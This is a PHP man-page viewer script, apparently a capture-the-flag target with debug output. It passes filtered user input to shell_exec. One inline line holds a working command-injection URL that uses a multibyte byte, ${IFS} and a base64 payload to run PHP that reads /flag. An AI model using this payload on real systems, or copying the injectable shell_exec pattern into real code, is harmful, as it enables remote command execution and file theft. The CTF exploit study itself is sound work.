<?php

    mb_regex_encoding('utf-8') or die('Invalid encoding');
    mb_internal_encoding('utf-8') or die('Invalid encoding');
    setlocale(LC_CTYPE, 'en_US.utf8');

    putenv('MANROFFOPT=-P -r'); // Disable the ugly line that groff normally produces
    putenv('PATH=/usr/bin:/bin'); // `man` want this, and I spent way too long to figure that out.

    $arg = urldecode($argv[1]);

    // Make sure there are no options (starting with - or -- or other non-word characters) within
    // the command, but still allow these characters in the middle because otherwise something really
    // simple like 'man fc-cache' or 'man ftw.h' breaks.
    // Also, don't allow shenanigans with ' or " that might allow someone to smuggle a few -- in there.
    $test1 = mb_ereg('(^|\\s+)\W+', $arg);
    echo "(^|\\s+)\W+: " . $test1 ."\n";
    $test2 = mb_strpos($arg, '"', 0, 'utf-8');
    $test3 = mb_strpos($arg, '\'', 0, 'utf-8');

    if ($test1 || $test2 || $test3) {
        $arg = mb_ereg_replace('(^|\\s+)\W+', '\\1', $arg);
        echo '1: ' . $arg;
        $arg = mb_ereg_replace('["\']', '', $arg);
        echo '2: ' . $arg;
        echo "Your query contains invalid characters\n";
    }
    http://172.17.0.2/?page=%EA%B0%80--html=echo${IFS}PGJvZHk%2BPD89YGNhdCAkKGxzIC9mbGFnKilgPz48L2JvZHk%2B|base64$IFS-d|php;+man
    if (mb_strlen($arg) > 0) {
        $arg = escapeshellcmd($arg); // Pass spaces through. Otherwise, we can't 'man git diff'
        $cmd = '/usr/bin/man --troff-device=html --encoding=UTF-8 ' . $arg . "\n";
        echo $cmd . "\n";
        $manpage = shell_exec('/usr/bin/man --troff-device=html --encoding=UTF-8 ' . $arg);
        if ($manpage !== NULL) {
            // Do some sensible styling. Sorry about the regex hell.
            // (And yes, I know what happens when you try to parse HTML with regex...)
            $start = mb_strripos($manpage, '<body>', 0, 'utf-8');
            $stop = mb_stripos($manpage, '</body>', 0, 'utf-8');
            $manpage = ($start <= $stop) ? mb_substr($manpage, $start, $stop - $start, 'utf-8') : '';
            // Unfortunately, HTML is case-insensitive, so use eregi here.
            $manpage = mb_eregi_replace('(</h[2-6]>)', '\\1<a class="top" href="#">↑</a>', $manpage);
            $manpage = mb_eregi_replace(
                '<b>([a-zA-Z0-9-_]+)</b>\\(([0-9a-z][a-z]?)\\)',
                '<a class="rel" href="/?page=\\1.\\2"><b>\\1</b>(\\2)</a>',
                $manpage
            );
            $manpage = mb_eregi_replace(
                '([a-zA-Z0-9-_]+)</b>\\(([0-9a-z][a-z]?)\\)',
                '</b><a class="rel" href="/?page=\\1.\\2"><b>\\1</b>(\\2)</a>',
                $manpage
            );
            $manpage = mb_eregi_replace(
                '([a-zA-Z0-9-_]+)\\(([0-9a-z][a-z]?)\\)',
                '<a class="rel" href="/?page=\\1.\\2"><b>\\1</b>(\\2)</a>',
                $manpage
            );
        } else {
            echo 'Could not find a manpage about ' . $arg;
        }
    }